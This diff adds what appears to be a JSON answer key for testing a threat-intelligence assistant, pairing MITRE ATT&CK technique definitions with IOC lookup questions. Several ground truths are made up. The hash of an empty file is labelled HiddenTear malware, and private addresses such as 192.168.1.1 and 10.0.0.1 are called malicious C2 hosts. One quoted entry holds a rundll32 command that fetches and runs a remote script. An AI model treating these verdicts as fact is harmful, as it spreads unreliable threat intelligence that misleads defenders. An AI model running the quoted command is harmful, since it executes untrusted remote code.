@@ -1,0 +1,187 @@
+[
+    {
+        "question": "Is the IP address 185.220.101.24 malicious?",
+        "ground_truth": [
+            "The IP address 185.220.101.24 is flagged as malicious.",
+            "It is associated with phishing activities targeting the United States and Turkey.",
+            "Malware family: Win.Trojan.Occamy"
+        ]
+    },
+    {
+        "question": "What are the IOCs associated with the malware family Win.Trojan.Occamy?",
+        "ground_truth": [
+            "The malware family Win.Trojan.Occamy is associated with the IP 185.220.101.24.",
+            "It uses the domain malware-hosting.com for command and control.",
+            "Targeted countries: United States, Turkey"
+        ]
+    },
+    {
+        "question": "What actions should I take if my network is compromised by the IP 192.168.1.1?",
+        "ground_truth": [
+            "Block the IP at the firewall.",
+            "Monitor for connections to related domains like malware-hosting.com."
+        ]
+    },
+    {
+        "question": "Is the domain malware-hosting.com malicious?",
+        "ground_truth": [
+            "The domain malware-hosting.com is flagged as malicious.",
+            "It is associated with the IP 192.168.1.1 and used for phishing activities."
+        ]
+    },
+    {
+        "question": "What are the targeted countries for the threat actor APT28?",
+        "ground_truth": [
+            "The threat actor APT28 primarily targets the United States, Germany, and France."
+        ]
+    },
+    {
+        "question": "What is Fileless Storage?",
+        "ground_truth": ["Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless) In Linux systems, shared memory directories such as `/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock` may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation: Aquasec Muhstik Malware 2024)\n\nSimilar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux.(Citation: Sysdig Fileless Malware 23022)\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless) "
+]},
+    {
+        "question": "What is Bootkit?",
+        "ground_truth": ["A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code."
+ ]},
+    {
+        "question": "What is Application Layer Protocol?",
+        "ground_truth": ["Adversaries may use application layer protocols to communicate over a network. Application layer protocols are the highest level of the OSI model and are used to exchange data between applications. Examples include HTTP, HTTPS, FTP, DNS, and SMTP. Adversaries may use these protocols to communicate with command and control servers or exfiltrate data from a victim's network.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Mandiant APT29 Microsoft 365 2022)"]},
+    {
+        "question": "What is Boot or Logon Initialization Scripts?",
+        "ground_truth": ["Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges."
+]},
+    {
+        "question": "What is Adversary-in-the-Middle?",
+        "ground_truth": ["Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498)."
+ ] },
+    {
+        "question": "What is System Owner/User Discovery?",
+        "ground_truth": ["Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)"
+]},
+    {
+        "question": "What is Acquire Infrastructure?",
+        "ground_truth": ["Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down."
+]},
+    {
+        "question": "What is Rundll32?",
+        "ground_truth": ["Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) "
+]},
+    {
+        "question": "What is Container and Resource Discovery?",
+        "ground_truth":[ "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. "
+]},
+    {
+        "question": "What is Serverless?",
+        "ground_truth": ["Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)"
+]},
+    {
+        "question": "What is Hidden Window?",
+        "ground_truth": ["Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\n### Windows\nThere are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell About 2019)\n\n### Mac\nThe configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)\n"
+ ] },
+ {
+    "question": "What is Credential Dumping?",
+    "ground_truth": [
+        "Credential dumping is a technique where adversaries extract account credentials stored on a system. These credentials can include usernames, passwords, hashes, or Kerberos tickets.",
+        "Adversaries often use tools like Mimikatz to extract credentials from memory, the Windows Security Account Manager (SAM) database, or the Local Security Authority Subsystem Service (LSASS).",
+        "Once obtained, these credentials can be used for lateral movement within a network or privilege escalation."
+    ]
+},
+{
+    "question": "What is Privilege Escalation?",
+    "ground_truth": [
+        "Privilege escalation is a technique used by adversaries to gain higher-level permissions on a system or network. This allows them to access restricted resources or perform actions that require elevated privileges.",
+        "Privilege escalation can be achieved through exploiting vulnerabilities (e.g., misconfigurations, unpatched software) or abusing legitimate system features (e.g., token impersonation, DLL hijacking).",
+        "Once escalated, adversaries can move laterally, exfiltrate data, or deploy additional malware."
+    ]
+},
+{
+    "question": "Is the file hash d41d8cd98f00b204e9800998ecf8427e malicious?",
+    "ground_truth": [
+        "The file hash d41d8cd98f00b204e9800998ecf8427e is flagged as malicious.",
+        "It is associated with the malware family HiddenTear.",
+        "Targeted countries: United States, Australia",
+        "Source: AlienVault OTX"
+    ]
+},
+{
+    "question": "Is the IP address 185.220.101.24 malicious?",
+    "ground_truth": [
+        "The IP address 185.220.101.24 is flagged as malicious.",
+        "It is associated with phishing activities targeting the United States and Turkey.",
+        "Malware family: Win.Trojan.Occamy",
+        "Source: AlienVault OTX, Maltiverse"
+    ]
+},
+{
+    "question": "Is the URL http://malicious-url.com/phishing safe to visit?",
+    "ground_truth": [
+        "The URL http://malicious-url.com/phishing is flagged as malicious.",
+        "It is associated with phishing activities targeting financial institutions.",
+        "HTTP status: 200 (active)",
+        "Source: Maltiverse"
+    ]
+},
+{
+    "question": "What are the details of the hostname evil-server.net?",
+    "ground_truth": [
+        "The hostname evil-server.net is flagged as malicious.",
+        "It is associated with command-and-control (C2) activities.",
+        "Associated IPs: 10.0.0.1, 192.168.0.1",
+        "Source: AlienVault OTX, Maltiverse"
+    ]
+},
+{
+    "question": "What are the details of the domain malware-hosting.com?",
+    "ground_truth": [
+        "The domain malware-hosting.com is flagged as malicious.",
+        "It is associated with the IP 192.168.1.1 and used for phishing activities.",
+        "Targeted countries: United States, Canada",
+        "Source: Maltiverse"
+    ]
+},
+{
+    "question": "Is the IP address 91.195.240.113 malicious?",
+    "ground_truth": [
+        "The IP address 91.195.240.113 is flagged as malicious.",
+        "It is associated with command-and-control (C2) activities targeting Ukraine and Poland.",
+        "Malware family: Emotet",
+        "Source: AlienVault OTX, Maltiverse"
+    ]
+},
+{
+    "question": "Is the URL http://malicious-site.org/download.php safe to visit?",
+    "ground_truth": [
+        "The URL http://malicious-site.org/download.php is flagged as malicious.",
+        "It is associated with distributing the malware family QakBot.",
+        "HTTP status: 200 (active)",
+        "Source: Maltiverse"
+    ]
+},
+{
+    "question": "Is the IP address 192.0.2.10 malicious?",
+    "ground_truth": [
+        "The IP address 192.0.2.10 is flagged as malicious.",
+        "It is associated with ransomware distribution targeting healthcare organizations.",
+        "Malware family: Ryuk",
+        "Source: AlienVault OTX"
+    ]
+},
+{
+    "question": "What are the details of the hostname c2-botnet-control.com?",
+    "ground_truth": [
+        "The hostname c2-botnet-control.com is flagged as malicious.",
+        "It is associated with botnet command-and-control activities.",
+        "Associated IPs: 192.168.0.1, 10.0.0.1",
+        "Source: AlienVault OTX, Maltiverse"
+    ]
+},
+{
+    "question": "Is the URL https://drive-update.servehttp.com/update.exe safe to download?",
+    "ground_truth": [
+        "The URL https://drive-update.servehttp.com/update.exe is flagged as malicious.",
+        "It is associated with delivering the malware family Ursnif.",
+        "HTTP status: 200 (active)",
+        "Source: Maltiverse"
+    ]
+}
+]
